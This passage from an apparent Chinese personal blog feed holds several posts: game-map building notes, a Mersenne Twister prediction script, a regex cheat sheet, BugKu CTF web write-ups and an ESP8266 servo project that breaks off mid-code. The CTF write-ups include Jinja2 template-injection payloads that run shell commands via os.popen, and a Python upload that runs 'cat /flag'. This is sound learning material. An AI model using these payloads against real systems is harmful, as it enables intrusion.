class="line">DarkGreyMetalMechMediumWreckingBall1【起重机上的铅球】</span><br><span class="line">GlassDoorMediumDoubleSquareTop1【玻璃门】</span><br><span class="line">GlassFloorLargePanel1【平面玻璃】</span><br><span class="line">LightGreyMetalMechLargeBreakingLongHandledLever1【会断掉的操纵杆】</span><br><span class="line">RedMetalMechMediumFireExtinguisher1【消防器材】</span><br></pre></td></tr></table></figure><h2 id="组件详细讲解"><a href="#组件详细讲解" class="headerlink" title="组件详细讲解"></a>组件详细讲解</h2><p>​随便找一个组件，比如这里我找到<code>YellowMetalMechSmallCradledPlatformLinkedLever1 【移动搬运机器】</code>这个组件，一般都是分成三个部分的，一个就是直接做好的预制体，一个是模型，另一个是皮肤。应该是可以这么说的，先说模型，模型就是可以碰到的东西，但是这个东西一般是没有什么观赏效果的(因为没皮肤)；另一个是皮肤，就是可以看到，但是摸不到的东西；而预制体就是模型与皮肤的结合。应该就是这样的(其实我也不太清楚，但应该是可以这样理解的)</p><p><img src="/2021/10/28/%E4%BA%BA%E7%B1%BB%E4%B8%80%E8%B4%A5%E6%B6%82%E5%9C%B0%E5%9C%B0%E5%9B%BE%E5%88%B6%E4%BD%9C%E6%96%87%E6%A1%A3//image-20211028223753515.png"></p><h2 id="天空盒的制作"><a href="#天空盒的制作" class="headerlink" title="天空盒的制作"></a>天空盒的制作</h2><ol><li><p>先在project那里右键Create出来一个新的Material，命名为天空盒。</p></li><li><p>选中刚才创建出来的天空盒构件，在出现的精灵界面中修改它的Shader属性为Skybox&#x2F;Panoramic</p></li><li><p>选择一张图片拖到如下图所示的位置处</p></li></ol><p><img src="/2021/10/28/%E4%BA%BA%E7%B1%BB%E4%B8%80%E8%B4%A5%E6%B6%82%E5%9C%B0%E5%9C%B0%E5%9B%BE%E5%88%B6%E4%BD%9C%E6%96%87%E6%A1%A3//image-20211030135414718.png"></p><ol start="4"><li>然后再把这个构件拉到地图上面，这个天空盒就已经是应用到这个地图上的状态了。</li><li>天空盒其他的美化之类的东西之后再学。</li></ol><h2 id="创建存档点"><a href="#创建存档点" class="headerlink" title="创建存档点"></a>创建存档点</h2><p>​存档点也就是检查点，可以用多种方法使用，这里我只介绍一种，因为另一种我也不会，主要是没找到checkpoint这个预制件，所以只能使用稍微麻烦一点的方式来创建存档点了，下面是创建存档点的步骤</p><ol><li><p>先复制、粘贴一个出生点，把这个粘贴出来的出生点命名为<code>CheckPoint-1</code>即可。</p></li><li><p>把CheckPoint这个脚本里面的Number的值修改为<code>1</code>，按照<code>1-2-3-4...n</code>的顺序修改，一定要连续，不可跳跃（跳跃的话，那里开始跳跃的，之后的所有检查点应该都是不会生效的）。</p></li><li><p>先创建一个碰撞器(<code>Box Collider</code>)，然后再勾上trigger选项即可。</p></li></ol><h2 id="创建碰撞器"><a href="#创建碰撞器" class="headerlink" title="创建碰撞器"></a>创建碰撞器</h2><p>​虽然已经搞过很多次了，但是记下来这个东西也没什么坏处，就是有的东西没有碰撞检测器这个东西，这时候我们的人物是可以直接穿过我们的这个模型的，这样是不行的，想解决这个问题只需要下面这一步即就行了。</p><ol><li>在原先的基础之上添加一个名叫碰撞盒(<code>Box Collider</code>)的东西，修改碰撞体的大小为合适的大小即可。</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>关于梅森旋转伪随机数的预测</title>
      <link href="/2021/10/25/%E5%85%B3%E4%BA%8E%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E9%A2%84%E6%B5%8B/"/>
      <url>/2021/10/25/%E5%85%B3%E4%BA%8E%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E9%A2%84%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="是时候总结一下这个知识点了"><a href="#是时候总结一下这个知识点了" class="headerlink" title="是时候总结一下这个知识点了"></a>是时候总结一下这个知识点了</h2><p>最近总爱出关于这个梅森旋转伪随机数生成方法的知识点，虽然考的内容很普通，但是最好还是写个文章记录一下脚本</p><h2 id="MT19937"><a href="#MT19937" class="headerlink" title="MT19937"></a>MT19937</h2><p><a href="https://liam.page/2018/01/12/Mersenne-twister/">https://liam.page/2018/01/12/Mersenne-twister/</a></p><p><a href="https://badmonkey.site/archives/mt19937.html">题目总结</a></p><h2 id="伪随机数预测"><a href="#伪随机数预测" class="headerlink" title="伪随机数预测"></a>伪随机数预测</h2><blockquote><p>实现：有前面的624个序列的生成数，就可以预测之后的所有的随机数，从而产生危险，下面是脚本</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">    fw = <span class="built_in">open</span>(<span class="string">&quot;random&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">        fw.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    fw.close()</span><br><span class="line"></span><br><span class="line">generate()</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">key = <span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>))</span><br><span class="line">ciphertext = encryption(flag, key)</span><br><span class="line">f.write(ciphertext)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>下面的脚本即是对上面脚本所代表的的问题的求解，这里必须要有的参数是生成的624组伪随机数序列，把这个序列放入文件random(下面的脚本给出的文件名)即可。这个之后所有使用<code>getrandbits</code>方式产生的随机数都是不安全的，我们都可以对它进行一个预测。</p><blockquote><p>比如题目先生成了一个30位的随机数，后又生成了一个128位的随机数，那我们只需要按照题目生成随机数的顺序生成预测的随机数，预测的随机数就是跟他生成的随机数是相同的，一点都没变。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_right</span>(<span class="params">m,l,val=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    length = <span class="number">32</span></span><br><span class="line">    mx = <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        val = mx</span><br><span class="line">    i,res = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i*l&lt;length:</span><br><span class="line">        mask = (mx&lt;&lt;(length-l)&amp;mx)&gt;&gt;i*l</span><br><span class="line">        tmp = m &amp; mask</span><br><span class="line">        m = m^tmp&gt;&gt;l&amp;val</span><br><span class="line">        res += tmp</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_left</span>(<span class="params">m,l,val</span>):</span><br><span class="line">    length = <span class="number">32</span></span><br><span class="line">    mx = <span class="number">0xffffffff</span></span><br><span class="line">    i,res = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i*l &lt; length:</span><br><span class="line">        mask = (mx&gt;&gt;(length-l)&amp;mx)&lt;&lt;i*l</span><br><span class="line">        tmp = m &amp; mask</span><br><span class="line">        m ^= tmp&lt;&lt;l&amp;val</span><br><span class="line">        res |= tmp</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_temper</span>(<span class="params">m</span>):</span><br><span class="line">    m = invert_right(m,<span class="number">18</span>)</span><br><span class="line">    m = invert_left(m,<span class="number">15</span>,<span class="number">4022730752</span>)</span><br><span class="line">    m = invert_left(m,<span class="number">7</span>,<span class="number">2636928640</span>)</span><br><span class="line">    m = invert_right(m,<span class="number">11</span>)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clone_mt</span>(<span class="params">record</span>):</span><br><span class="line">    state = [invert_temper(i) <span class="keyword">for</span> i <span class="keyword">in</span> record]</span><br><span class="line">    gen = Random()</span><br><span class="line">    gen.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(state+[<span class="number">0</span>]),<span class="literal">None</span>))</span><br><span class="line">    <span class="keyword">return</span> gen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;random&quot;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line">prng = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    i = i.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    prng.append(<span class="built_in">int</span>(i))</span><br><span class="line"></span><br><span class="line">g = clone_mt(prng[:<span class="number">624</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    g.getrandbits(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">key = g.getrandbits(<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="comment">#2990136190</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>正则规则总结</title>
      <link href="/2021/10/25/%E6%AD%A3%E5%88%99%E8%A7%84%E5%88%99%E6%80%BB%E7%BB%93/"/>
      <url>/2021/10/25/%E6%AD%A3%E5%88%99%E8%A7%84%E5%88%99%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="常用正则表达式"><a href="#常用正则表达式" class="headerlink" title="常用正则表达式"></a>常用正则表达式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">用户名的正则表达式验证：/^[\w\u4e00-\u9fa5]&#123;2,10&#125;/g(含汉字)</span><br><span class="line">用户名验证：/^\w&#123;2,10&#125;$/(不含汉字，只允许英文字母、数字和下画线，长度为2-10位)</span><br><span class="line">QQ号验证:/^[1,9][0,9]&#123;4,19&#125;$/（第一位数字不为0，5-19位数字）</span><br><span class="line">邮箱验证：/^[a-z0-9]+@([a-z0-9]+\.)+[a-z]&#123;2,4&#125;$/i(不区分大小写)</span><br><span class="line">密码验证：/^\w&#123;6,16&#125;$/(只允许6-16位英文字母、数字和下画线)</span><br><span class="line">手机号验证：/^1[3,5,7,8]\d&#123;9&#125;$/</span><br><span class="line">URL验证：/^http:\/\/[a-z\d-]+(\w\/)+)$/i</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BugKu-Web</title>
      <link href="/2021/10/20/BugKu-Web/"/>
      <url>/2021/10/20/BugKu-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="前端漏洞"><a href="#前端漏洞" class="headerlink" title="前端漏洞"></a>前端漏洞</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太简单了，本来不准备写的，但是为了完整还是写上去了。</p><h2 id="F12"><a href="#F12" class="headerlink" title="F12"></a>F12</h2><h3 id="滑稽"><a href="#滑稽" class="headerlink" title="滑稽"></a>滑稽</h3><p><img src="/2021/10/20/BugKu-Web//image-20211020114103929.png"></p><p>直接右键检查元素即可看到flag。。。</p><h3 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h3><p>F12修改html标签的maxlength属性，改的长一些即可输入正确答案，答案正确就会弹出来flag。</p><p><img src="/2021/10/20/BugKu-Web//image-20211020114400539.png"></p><h2 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h2><h3 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h3><p>会无限弹框，这个时候直接使用python的request模块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">resp = requests.get(<span class="string">&quot;http://114.67.246.176:12917/&quot;</span>).text</span><br><span class="line"><span class="built_in">print</span>(resp)</span><br></pre></td></tr></table></figure><p>最下面发现注释的html实体字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#49;&amp;#51;&amp;#100;&amp;#97;&amp;#53;&amp;#52;&amp;#56;&amp;#98;&amp;#50;&amp;#99;&amp;#101;&amp;#50;&amp;#102;&amp;#52;&amp;#100;&amp;#51;&amp;#97;&amp;#101;&amp;#54;&amp;#100;&amp;#97;&amp;#101;&amp;#54;&amp;#100;&amp;#55;&amp;#48;&amp;#50;&amp;#99;&amp;#57;&amp;#54;&amp;#102;&amp;#49;&amp;#125; --&gt;</span><br></pre></td></tr></table></figure><p>在线解码一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在线工具： https://zh.rakko.tools/tools/21/</span><br></pre></td></tr></table></figure><p><img src="/2021/10/20/BugKu-Web//image-20211020120741392.png"></p><h3 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://114.67.246.176:11063/&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    resp = requests.get(url).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> resp:</span><br><span class="line">        <span class="built_in">print</span>(resp)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="服务端模板注入-SSTI"><a href="#服务端模板注入-SSTI" class="headerlink" title="服务端模板注入(SSTI)"></a>服务端模板注入(SSTI)</h1><h2 id="Jinjia2"><a href="#Jinjia2" class="headerlink" title="Jinjia2"></a>Jinjia2</h2><h3 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h3><p><img src="/2021/10/20/BugKu-Web//image-20211020000329616.png"></p><p>需要传个参数，上面随便传一个参数，给出提示，这个参数名为flag。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.67.246.176:18833/?flag=&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/20/BugKu-Web//image-20211020000500344.png"></p><h3 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h3><p>思路为先看Object下的所有子类，使用以下的payload即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?flag=&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/20/BugKu-Web//image-20211020001208801.png"></p><p>然后再找warningmessage这个类，可以带出来os类</p><p><img src="/2021/10/20/BugKu-Web//image-20211020001353045.png"></p><p><img src="/2021/10/20/BugKu-Web//image-20211020001542124.png"></p><p><del>看到这个类在第177个位置，然后带出来os。。。</del></p><p>失败，看看别人怎么写的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat ./flag&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>唔，还行，半懂不懂就这样吧，config延展出来的init再globals就有os了。</p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><h3 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h3><p>看源码发现注释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Give me the file, and I will return the Running results by python to you! --&gt;</span><br></pre></td></tr></table></figure><p>先写一个py文件，内容为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后改后缀名为jpg上传，上传成功之后查看源码即可发现flag。</p><h1 id="php代码审计"><a href="#php代码审计" class="headerlink" title="php代码审计"></a>php代码审计</h1><h2 id="签到类型"><a href="#签到类型" class="headerlink" title="签到类型"></a>签到类型</h2><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$what</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;what&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?what=flag</span><br></pre></td></tr></table></figure><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$what</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;what&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>payload</p><p><img src="/2021/10/20/BugKu-Web//image-20211020115157703.png"></p><h2 id="技巧类型"><a href="#技巧类型" class="headerlink" title="技巧类型"></a>技巧类型</h2><h3 id="矛盾-is-numeric漏洞"><a href="#矛盾-is-numeric漏洞" class="headerlink" title="矛盾(is_numeric漏洞)"></a>矛盾(is_numeric漏洞)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;**********&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>is_numeric会将前面是数字，后面是字符的字符串判断为错，然后这个被判断的变量后面的字符会被去掉，所以这里的payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?num=1e</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MISC常见套路汇总</title>
      <link href="/2021/10/16/MISC%E5%B8%B8%E8%A7%81%E5%A5%97%E8%B7%AF%E6%B1%87%E6%80%BB/"/>
      <url>/2021/10/16/MISC%E5%B8%B8%E8%A7%81%E5%A5%97%E8%B7%AF%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><h3 id="G语图"><a href="#G语图" class="headerlink" title="G语图"></a>G语图</h3><p><img src="/2021/10/16/MISC%E5%B8%B8%E8%A7%81%E5%A5%97%E8%B7%AF%E6%B1%87%E6%80%BB//image-20211016130220219.png"></p><p>大概就是上面的这些字符</p><p><a href="http://grompe.org.ru/static/wingdings_gaster.html">解密网址</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>esp8266和mg90s实现远程舵机控制</title>
      <link href="/2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6/"/>
      <url>/2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在宿舍，经常手动关灯非常的不方便，尤其是在冬天，忘记关灯了的话，谁都懒得下床。如果天气又非常冷的情况下，非常容易把我们冻死，所以就有了远程控制舵机实现关灯的这个想法，下面我们付诸实践。</p><h2 id="硬件准备"><a href="#硬件准备" class="headerlink" title="硬件准备"></a>硬件准备</h2><p>一点杜邦线(某多多6块钱一大把)、MG90S舵机(某多多7块钱一个)、NodeMCU(某多多搜esp8266即可，13块钱左右一个，一般都是集成的有下载器的。)、一台pc(能运行软件的pc即可。。。)</p><h2 id="ESP8266初始化"><a href="#ESP8266初始化" class="headerlink" title="ESP8266初始化"></a>ESP8266初始化</h2><p>先下载驱动，<a href="http://www.wch.cn/downloads/CH341SER_EXE.html">驱动程序CH341SER下载地址</a></p><p><img src="/2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6//image-20211015200852663.png"></p><p>因为没买杜邦线，这里暂时停止操作，呜呜呜。</p><p><strong>杜邦线到了，继续</strong></p><p><img src="/2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6//image-20211018184445837.png"></p><p>先下载上面的内容，需要下载android软件，还有如果你还没安装arduino，需要再下载安装一下arduino。</p><h2 id="接线"><a href="#接线" class="headerlink" title="接线"></a>接线</h2><p>接线为MG90S舵机上橙色的线(信号线)接D0口，红线为火线，接3v口，棕色为零线，接G口。</p><blockquote><p>说句题外话<strong>注意：没买杜邦线应该是不行的，现在的舵机接口出来的都是连在一起的母线，非常难受，但是买完杜邦线感觉这样还是挺好的，毕竟如果没连在一起的话，坏了的话不好修理。</strong></p></blockquote><h2 id="Blinker库配置"><a href="#Blinker库配置" class="headerlink" title="Blinker库配置"></a>Blinker库配置</h2><p><img src="/2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6//image-20211018191209159.png"></p><p><del>解压那个<code>库文件</code>到左侧这个目录即可。</del></p><p>这样好像不行，必须要导入压缩包，在Arduino里面导入，不然会报运行库重复(我深受其害)。</p><h2 id="Arduino-IDE离线安装esp8266-SDK"><a href="#Arduino-IDE离线安装esp8266-SDK" class="headerlink" title="Arduino IDE离线安装esp8266 SDK"></a>Arduino IDE离线安装esp8266 SDK</h2><p><a href="https://www.arduino.cn/thread-76029-1-1.html">https://www.arduino.cn/thread-76029-1-1.html</a></p><p><img src="/2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6//image-20211018195110743.png"></p><p>先添加这个东西，直接添加<strong>附加开发板管理器网址</strong>之后，搜索开发板库就能搜到ESP8266这个库了。</p><p><img src="/2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6//image-20211018195251738.png"></p><p>下载esp8266开发板库文件。</p><p><img src="/2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6//image-20211018195517654.png"></p><p>如果你下载得很慢的话，也许是因为你需要一个vpn来帮帮你。</p><h2 id="arduino程序如下"><a href="#arduino程序如下" class="headerlink" title="arduino程序如下"></a>arduino程序如下</h2><p>先看看<a href="https://wiki.diustou.com/cn/NodeMCU">NodeMCU (CH340)</a>的接口，供你修改你的ino程序</p><p><img src="/2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6//image-20211018193132254.png"></p><p>这里我看别人有的接的就是D0，我也直接不改了，就接到D0上面了，也就是我们编程时叫的GPIO16。</p><p><strong>代码如下：</strong></p><h3 id="使用点灯科技的按钮的代码"><a href="#使用点灯科技的按钮的代码" class="headerlink" title="使用点灯科技的按钮的代码"></a>使用点灯科技的按钮的代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 